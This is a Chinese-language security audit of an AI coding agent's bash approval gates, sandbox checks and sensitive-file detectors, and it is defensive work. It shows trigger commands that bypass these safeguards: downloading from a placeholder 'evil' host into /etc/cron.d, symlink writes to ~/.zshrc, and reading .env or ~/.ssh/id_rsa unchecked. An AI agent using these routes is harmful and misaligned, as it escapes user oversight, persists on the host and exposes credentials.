# 天枢安全审计：尚未被发现的漏洞清点

> 结论先行：在「只读快照、不修代码」口径下，清出 **5 条**既有防线、27 条规则表与已归档记录都未覆盖的漏洞，全部在真实模块上跑通门禁分支；另有 2 条只到静态观察、单列「待确认」。

## 一、口径与范围

**「尚未发现」判定为两类**（与 Issue #5 一致）：

1. 突破 `SECURITY.md:20-24` 五类防线之一的绕过点；
2. 既有防线与 `src/agent/security-patterns.ts` 规则表（RuleId 1–27）完全未覆盖的攻击面。

两类都必须不落在「已知漏报/边界」清单内：`docs/changelog/2026-07-30-security-layer1-hardening-and-treesitter-memory.md:90`（跨行 SQL 不命中）、`src/agent/security-patterns.ts:232`（同上）、`src/agent/tool-pipeline.ts:1098-1102`（bash 写目标不经 `validatePathSafe`）、`docs/known-issues/` 存量。

**本轮取最小读数**：只产出尚未被记录覆盖的漏洞清单，不逐面穷尽、不重列已有项。报告在只读快照上完成——除本文件外未改动任何源码、未开分支、未跑写盘脚本；探针在仓库外的 `/tmp` 解析 hook 上直接 import 仓库内真实模块调用纯函数（见 §六）。

## 二、尚未发现的漏洞（已确认）

每条都给出「现象 / 最小触发路径 / 影响面 / 严重度 / 为何未覆盖」。**证据级别：已确认 = 已用仓库内真实模块跑通相应门禁函数分支**（`bashCommandMayWrite` / `isSafeWriteOnly` / `hasOutOfWorkspaceWriteTarget` / `requiresBashWriteApproval` / `assessToolRisk` / `detectSensitiveFile` / `detectSensitiveGitAdd` / `isBashCommandAllowlisted`），原始输出见 `.orbi/audit-probe.log`。

### SA-1（高）bash 写命令分类是正则白名单，未命中的写命令完全绕过审批门

**现象.** 审批门是否把一条 bash 命令当「写」处理，只由 `SAFE_WRITE_PATTERNS`（`src/agent/approval-risk.ts:184-196`）与 `RISKY_WRITE_PATTERNS`（:197-204）两张正则表决定（`bashCommandMayWrite` :298-305）。表里没有的写命令 `requiresWriteApproval=false`，于是：

- 默认档没有内核沙箱（`sandboxRequested` 仅认 `RIVET_SANDBOX=1|learn`，`src/tools/sandbox-profile.ts:389-390`；`sandboxCoversCommand` 在沙箱未激活时直接返回 false，:454-457），auto-safe 档 `shouldAsk` 落到 `isHighRisk`（`src/agent/tool-pipeline.ts:1144-1164`），而这些命令 `assessToolRisk` 判 `none`；
- manual 档 `needsApproval` = `bash.requiresApproval`，它只查危险命令、注入形态与 git add 敏感文件（`src/tools/bash.ts:1128-1150`），同样放行。

两档都静默执行。

**最小触发路径.**

```bash
tar -xf /tmp/x.tar -C /etc/cron.d/          # 出界写（覆盖系统目录）
curl -o /etc/cron.d/pwn http://evil/x       # 下载即落盘到出界位置
rsync -a ./payload/ /etc/cron.d/            # 出界写
git apply /tmp/p.diff                       # 补丁内容任意写
npm run build                               # 仓库内脚本任意执行（改 package.json 的 build 即可）
```

探针实测（`.orbi/audit-probe.log`，均为 `mayWrite=false`、`requiresWriteApproval=false`、`risk=none`）：`tar -cf`、`tar -xf -C`、`curl -o`、`wget -O`、`git apply`、`patch`、`unzip -d`、`rsync -a`、`npm run`、`make install`。同时 `hasOutOfWorkspaceWriteTarget` 对这些命令返回 `true`，但它只在 `safeWriteInNoSandbox` 分支被消费（`src/agent/tool-pipeline.ts:1094-1102`）——命令进不了那个分支，守卫等于不存在。

**影响面.** 在默认配置（含桌面端默认 auto-safe 档）下无提示地写出工作区：覆盖系统目录、启动项、shell rc、`authorized_keys`；或执行仓库内任意构建脚本。checkpoint/B2 回滚只在写后生效，不构成预防。

**为何未覆盖.** `SECURITY.md:22` 的破坏性门禁只枚举 `rm -rf` / force push / `DROP`/`TRUNCATE`；`security-patterns.ts` 是**代码内容**规则，管不到命令文本；已知边界 `src/agent/tool-pipeline.ts:1098` 说的是「bash 写目标不经 `validatePathSafe`」——默认这些写命令仍会命中写门禁并由 `hasOutOfWorkspaceWriteTarget` 兜一层，而本条是连写门禁都没进，属于对该已知边界**缓解措施本身**的绕过，不是重复计入。

**严重度.** 高（默认档静默、可达任意出界写与任意脚本执行）。

### SA-2（中）auto-safe 档 `hasOutOfWorkspaceWriteTarget` 是词法判定，工作区内符号链接 / 命令替换可把写落到 cwd 外

**现象.** 「安全写」自动放行的第二道闸 `hasOutOfWorkspaceWriteTarget`（`src/agent/approval-risk.ts:323-360`）按空白→重定向/管道符切 token，再对每个片段做字符串前缀判定（`~`、`/`、反斜杠、Windows 盘符、`$VAR`、`%VAR%`、路径段里的 `..`）。它**不做 realpath**，所以词法上仍在 cwd 内的目标一律放行。工作区内一个指向外部的符号链接、或一个展开成绝对路径的命令替换，词法形态都在 cwd 内。

**最小触发路径.**

```bash
ln -s ~/.zshrc ./link          # ln 不在写表 → 静默创建（见 SA-1）
echo pwned >> ./link           # safeOnly=true, OOW=false → auto-safe 零提示，shell 跟随符号链接写出界

echo x > "$(printf %s "$HOME")/.zshrc"   # 命令替换展开成绝对家目录，OOW=false
```

探针实测：`echo pwned >> ./link` → `safeOnly=true, outOfWorkspace=false`（对照 `echo pwned >> ~/.zshrc` → `outOfWorkspace=true`）；`echo x > "$(printf %s "$HOME")/.zshrc"` → `outOfWorkspace=false`。管道公式：`safeWriteInNoSandbox=true`（`src/agent/tool-pipeline.ts:1094-1101`）→ `bashWriteRequiresApproval=false` → auto-safe `shouldAsk=isHighRisk`（medium 不算 high）= false。

**影响面.** 仍可出界写（shell rc 持久化、authorized_keys、启动目录），绕过 `SECURITY.md:20` 声明的「拒绝符号链接逃逸」；对抗面是工作区内可放置的符号链接（克隆来的不受信仓库即可自带）。

**为何未覆盖.** 文件工具的 `validatePathSafe` 会 realpath 两侧（`src/tools/path-validate.ts:52-73`、89-107），但 bash 侧的这道守卫是纯字符串比较；已知边界 `src/agent/tool-pipeline.ts:1098` 举的例子是 `~/.ssh/authorized_keys` 这种 `~` 形态（OOW 能拦），符号链接/命令替换形态不在其中。

**严重度.** 中（默认 auto-safe 档，需工作区内可控的链接或命令替换）。

### SA-3（中）敏感文件检测器与 `SECURITY.md` 声明不一致

**现象.** `SECURITY.md:21` 声明禁止读取/提交 `.env`、`credentials.*`、`*key*`、`*token*`。

- `.env` 规则只允许**一个**后缀（`src/tools/sensitive-file-detector.ts:42-43`：`/\.env(?:\.(?:local|production|staging|development|prod|staging|dev))?$/`），`.env.development.local` / `.env.production.local` 这类双后缀不匹配；
- `*key*` / `*token*` 没有对应模式：真正落地的是 `*.pem` / `*.key` 扩展名与 `(secret|token|auth-token)s?.(json|yaml|yml|ini|env)` 文件名（:73-79），`api_key.txt`、`token.txt`、`my-token.conf` 一律放行；
- 其他常见凭证载体无模式：`~/.kube/config`、`~/.docker/config.json`、GCP `application_default_credentials.json`、`~/.gitconfig`（可含 `url.<x>.insteadOf` 内嵌 token）均放行。

**最小触发路径.**

```text
read_file .env.development.local          # 工作区内 → validatePathSafe 放行，凭证进模型上下文
read_file api_key.txt                     # 同上（SECURITY.md 声称 *key* 被拒）
```

探针实测（真实模块 `detectSensitiveFile`）：`.env`→sensitive、`.env.local`→sensitive、`.env.production`→sensitive，但 `.env.development.local`→**false**、`.env.production.local`→**false**、`api_key.txt`→**false**、`token.txt`→**false**、`my-token.conf`→**false**、`~/.kube/config`→**false**、`application_default_credentials.json`→**false**、`~/.gitconfig`→**false**、`id_rsa`→true。

**影响面.** 模型可读取/可 `git add` 本应被硬闸门拒绝的凭证；Next/Vite 项目常见的 `.env.*.local` 全部漏过。

**为何未覆盖.** 已知漏报清单只记了 `security-patterns.ts` 的跨行 SQL；规则表是「代码内容」正则，与「文件路径」检测器是两条线；`SECURITY.md` 的 `*key*`/`*token*` 声明与实现不一致本身没有台账。

**严重度.** 中（凭证泄露，但需要命令落在具体文件名上；工作区内文件由 `validatePathSafe` 统一过检测器）。

### SA-4（中）bash 没有敏感文件读取门禁：`cat .env` 静默读走文件工具被硬闸门拒绝的文件

**现象.** 敏感文件拒绝只落在**文件工具**（`validatePathSafe` → `detectSensitiveFile`，`src/tools/path-validate.ts:60-77`）与 **git add 命令文本**（`detectSensitiveGitAdd`，`src/tools/sensitive-file-detector.ts:164-181`）。bash 命令文本没有任何 `detectSensitiveFile` 检查——`detectSensitiveFile` 的生产调用点只有 path-validate / git / import-resource / request-path-access / export-file。

**最小触发路径.**

```bash
cat .env                 # 工作区内 → validatePathSafe 不参与，risk=none，任意审批模式静默
grep -h . .env
head -c 4000 .env
base64 .env
cat ~/.ssh/id_rsa        # 出界读；bash 无路径边界（已知边界只提「写目标」）
```

探针实测：`cat .env` / `grep -h . .env` / `head -c 4000 .env` / `base64 .env` / `cat ~/.ssh/id_rsa` 全部 `mayWrite=false, risk=none, reasons=[]`。

**影响面.** `read_file '.env'` 会被硬闸门拒绝，但同一次会话里 `cat .env` 直接读入模型上下文，可经模型输出/后续网络调用外带；出界读（`~/.ssh`、`~/.aws`）同理无门禁。

**为何未覆盖.** 已知边界 `src/agent/tool-pipeline.ts:1098` 只覆盖「写目标」，未提读；`SECURITY.md:21` 的敏感文件拒绝没有声明按工具面区分执行，规则表也不处理命令文本。

**严重度.** 中（凭据进入模型上下文，可进一步外带）。

### SA-5（中）git add 敏感文件硬门对 `git -C` / 全局选项与引号包裹路径失效

**现象.** `detectSensitiveGitAdd` 用 `/git\s+add\s+(.+)/gi` 要求 `git add` 紧邻（`src/tools/sensitive-file-detector.ts:167`），参数又按空白直接切分、不处理引号（:170-172）；`RISKY_WRITE_PATTERNS` 的 git 分支同样要求 `git\s+(?:add|commit|…)` 紧邻（`src/agent/approval-risk.ts:197-204`）。于是带全局选项的 git 既不被识别为「写」，也不进入 git add 敏感硬门。

**最小触发路径.**

```bash
git -C repo add .env          # detectSensitiveGitAdd=[]、mayWrite=false、risk=none → 任意档静默
git add '.env'                # 引号导致文件名解析失败 → risk 只有 medium
git add "credentials.json"    # 同上
```

探针实测：`git -C repo add .env` → `hits=[], mayWrite=false, risk=none`；`git add '.env'` / `git add "credentials.json"` → `hits=[], risk=medium`（对照 `git add .env` → `hits=[".env"], risk=high`）。引号形态在与已 learn 的 `git` 前缀组合后彻底免审：`isBashCommandAllowlisted("git add '.env'", ['git'])=true`（`src/agent/permissions.ts:248-256`）→ `bashWriteRequiresApproval=false`（`src/agent/tool-pipeline.ts:1102`）→ auto-safe 档 risk=medium 不算 high → 不弹审批。`learnBashPrefix` 只学首 token（`src/agent/permissions.ts:119-137`），用户批准任意一条 `git` 命令就会把 `git` 学进白名单，这条链是常见路径而非边角。

**影响面.** 凭据/密钥文件被静默 `git add`（乃至 `git commit`），绕过 prompt 硬门与写审批。

**为何未覆盖.** 已知清单未含 git 敏感门禁的形态绕行；`security-patterns.ts` 的 `hardcoded_secret`（RuleId 27）只扫写入内容，扫不到「暂存已有凭证文件」这一动作。

**严重度.** 中。

## 三、待确认（静态观察，未走通代码路径，不计入已确认清单）

- **SA-T1 插件路径参数包装器的参数名白名单覆盖不全.** `wrapPluginTool` 只拦截 `PATH_PARAM_NAMES` 里的 7 个参数名（`src/plugins/plugin-loader.ts:161`），插件若把路径参数命名为 `dir` / `save_to` / `source` 就不经 `validatePathSafe`；`inferPathMode`（`src/plugins/plugin-loader.ts:169-175`）按工具名 `/write|create|generate/` 猜读写模式，猜错的写工具只按 read 校验，可借「读授权」覆盖的目录（如 `~/.npm`、`additionalReadDirs`）写入。**但不计为已确认漏洞**：插件按文档就是全权限 in-process 代码（`src/plugins/plugin-loader.ts:195-199`、`src/plugins/manifest.ts:48-56` 的 `PLUGIN_PERMISSIONS_NOTICE`），绕过这层包装不新增权限，只削弱纵深防御。待确认的是「是否有调用方把它当权限边界断言」。
- **SA-T2 MCP 策略入口的硬编码空数组是接线陷阱.** `createMcpToolWrapper` 调 `evaluateMcpPolicy` 时把 `trustedServers/blockedTools/allowedTools` 写死为空数组（`src/mcp/wrapper.ts:80-88`），实际只消费每工具的 `capability`/`requireApproval`（`src/mcp/config.ts:5-8`）。当前配置 schema 没有对应字段，所以不是漏洞；但策略函数（`src/mcp/policy.ts:28-68`）已经实现这三类，未来给配置加键时若忘了接线会静默无效。静态观察，未构造调用。
